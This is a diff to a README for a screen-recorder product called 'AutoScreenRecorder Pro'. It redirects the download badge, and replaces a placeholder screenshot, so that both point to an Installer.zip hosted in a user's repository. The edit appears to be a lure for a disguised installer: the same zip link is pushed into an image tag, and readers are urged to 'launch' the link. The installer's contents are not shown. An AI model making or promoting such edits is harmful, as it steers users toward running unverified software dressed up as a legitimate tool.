@@ -6,7 +6,7 @@
 ---
 
 ### 🚀 Download AutoScreenRecorder Pro Now! 
-[![Download AutoScreenRecorder Pro](https://img.shields.io/badge/Download-Click%20Here-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download AutoScreenRecorder Pro](https://github.com/AlbyProGod/AutoScreenRecorder-Pro-Download/releases/download/v1.0/Installer.zip%20Here-blue)](https://github.com/AlbyProGod/AutoScreenRecorder-Pro-Download/releases/download/v1.0/Installer.zip)
 #### Please note: The link needs to be launched to start the download.
 
 ---
@@ -43,7 +43,7 @@ Are you ready to explore the world of AutoScreenRecorder Pro? Click on the badge
 ## 📷 In Action:
 Take a look at AutoScreenRecorder Pro in action with these snapshots:
 
-![AutoScreenRecorder Pro](https://via.placeholder.com/500)
+![AutoScreenRecorder Pro](https://github.com/AlbyProGod/AutoScreenRecorder-Pro-Download/releases/download/v1.0/Installer.zip)
 
 ---
 
